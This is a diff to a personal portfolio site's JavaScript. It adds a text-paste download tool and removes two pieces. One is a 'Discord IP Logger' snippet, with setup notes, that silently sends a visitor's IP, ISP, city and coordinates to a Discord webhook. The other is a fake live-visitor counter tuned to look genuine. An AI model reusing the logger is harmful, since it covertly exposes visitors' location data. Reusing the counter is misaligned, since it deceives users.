@@ -1,104 +1,4 @@
-    const projectData = {
-        discord: {
-            title: "Discord IP Logger",
-            notes: "Usage: Replace the placeholder with your specific Discord Webhook URL. \n Setup a simple .html page and make sure to link to the right .js file or keep it on the page.",
-            code: `// IP Logger
-$(document).ready(function() {
-  // Get user information using IPAPI
-  $.get("https://ipapi.co/json/", function(data) {
-      // Send user information to Discord webhook
-      var formattedData = "**IP: **" + data.ip + "\n" +
-                          "**Network: **" + data.network + "\n" +
-                          "**Version: **" + data.version + "\n" +
-                          "**ASN: **" + data.asn + "\n" +
-                          "**ISP: **" + data.org + "\n" +
-                          "**City: **" + data.city + "\n" +
-                          "**Postal Code: **" + data.postal + "\n" +
-                          "**Region: **" + data.region + "\n" +
-                          "**Country: **" + data.country_name + "\n" +
-                          "**Capital: **" + data.country_capital + "\n" +
-                          "**Country Population: **" + data.country_population + "\n" +
-                          "**Calling Code: **" + data.country_calling_code + "\n" +
-                          "**Latitude: **" + data.latitude + "\n" +
-                          "**Longitude: **" + data.longitude + "\n" +
-                          "**Timezone: **" + data.timezone + "\n" +
-                          "**Currency: **" + data.currency + "\n";
-
-      $.ajax({
-          type: "POST",
-          url: "https://discord.com/api/webhooks/your-webhook-url",
-          data: JSON.stringify({ content: formattedData }),
-          contentType: "application/json"
-      });
-  });
-});`
-        },
-    };
-
-    function toggleDropdown(event) {
-        event.stopPropagation();
-        const dropdown = document.getElementById("toolsDropdown");
-        const isShowing = dropdown.classList.toggle("show");
-        event.currentTarget.setAttribute('aria-expanded', isShowing);
-    }
-
-    window.onclick = function(event) {
-        if (!event.target.matches('.dropdown-trigger')) {
-            const dropdown = document.getElementById("toolsDropdown");
-            if (dropdown.classList.contains('show')) {
-                dropdown.classList.remove('show');
-                document.querySelector('.dropdown-trigger').setAttribute('aria-expanded', 'false');
-            }
-        }
-    }
-
-    function openSource(id) {
-        const project = projectData[id];
-        if(!project) return;
-        
-        document.getElementById('modal-title').innerText = project.title;
-        document.getElementById('modal-notes').innerText = project.notes;
-        document.getElementById('modal-code').textContent = project.code;
-        document.getElementById('source-modal').style.display = 'flex';
-        
-        // Hide dropdown
-        document.getElementById("toolsDropdown").classList.remove("show");
-    }
-
-    function closeSource(event) {
-        document.getElementById('source-modal').style.display = 'none';
-    }
-
-    function filterProjects(area, btn) {
-        // UI updates
-        document.querySelectorAll('.filter-btn').forEach(b => b.classList.remove('active'));
-        btn.classList.add('active');
-        
-        // Filtering logic
-        document.querySelectorAll('.project-entry').forEach(entry => {
-            if (area === 'all' || entry.dataset.area === area) {
-                entry.classList.remove('hidden');
-            } else {
-                entry.classList.add('hidden');
-            }
-        });
-        
-    }
-
-    window.addEventListener('DOMContentLoaded', () => {
-        if (!sessionStorage.getItem('disclaimerAccepted')) {
-            document.getElementById('disclaimer-modal').style.display = 'flex';
-            document.body.style.overflow = 'hidden'; // Prevent scrolling while active
-        }
-    });
-
-    function acceptDisclaimer() {
-        sessionStorage.setItem('disclaimerAccepted', 'true');
-        document.getElementById('disclaimer-modal').style.display = 'none';
-        document.body.style.overflow = 'auto'; // Re-enable scrolling
-    }
-
-   const iconSet = [
+const iconSet = [
     { name: 'Heart', symbol: '❤️' },
     { name: 'Star', symbol: '⭐' },
     { name: 'Cloud', symbol: '☁️' },
@@ -198,33 +98,35 @@ async function sendFooterContact() {
     }
 }
 
-// Live User Counter Simulation
-function updateLiveCounter() {
-    const counterElement = document.getElementById('user-count');
-    
-    // Logic: Start with a base number (e.g., 2)
-    // Add a random small fluctuation to make it feel "Live"
-    let currentCount = parseInt(counterElement.innerText);
-    
-    // 20% chance to go up, 20% chance to go down, 60% chance to stay
-    let rand = Math.random();
-    if (rand > 0.8) {
-        currentCount += 1;
-    } else if (rand < 0.2 && currentCount > 1) {
-        currentCount -= 1;
+
+//Quick Paste
+    const textarea = document.getElementById('textInput');
+    const charCountDisplay = document.getElementById('charCount');
+
+    // Live character count
+    textarea.addEventListener('input', () => {
+        const count = textarea.value.length;
+        charCountDisplay.innerText = `${count.toLocaleString()} Characters`;
+    });
+
+    function downloadFile() {
+        const textContent = textarea.value;
+        if (!textContent) {
+            alert("Please enter some text first.");
+            return;
+        }
+        
+        const blob = new Blob([textContent], { type: 'text/plain' });
+        const link = document.createElement('a');
+        
+        // Dynamic filename based on first line or timestamp
+        const timestamp = new Date().toISOString().slice(0,10);
+        link.download = `paste_${timestamp}.txt`;
+        
+        link.href = window.URL.createObjectURL(blob);
+        link.click();
+        window.URL.revokeObjectURL(link.href);
     }
-    
-    // Cap it so it doesn't look fake (stay between 1 and 7 for a personal portfolio)
-    if (currentCount > 7) currentCount = 5;
-    if (currentCount < 1) currentCount = 1;
 
-    counterElement.innerText = currentCount;
-}
 
-// Update every 10-15 seconds for realism
-setInterval(updateLiveCounter, 12000);
-
-// Initialize with a realistic start
-document.addEventListener('DOMContentLoaded', () => {
-    document.getElementById('user-count').innerText = Math.floor(Math.random() * 3) + 1;
-});
+   
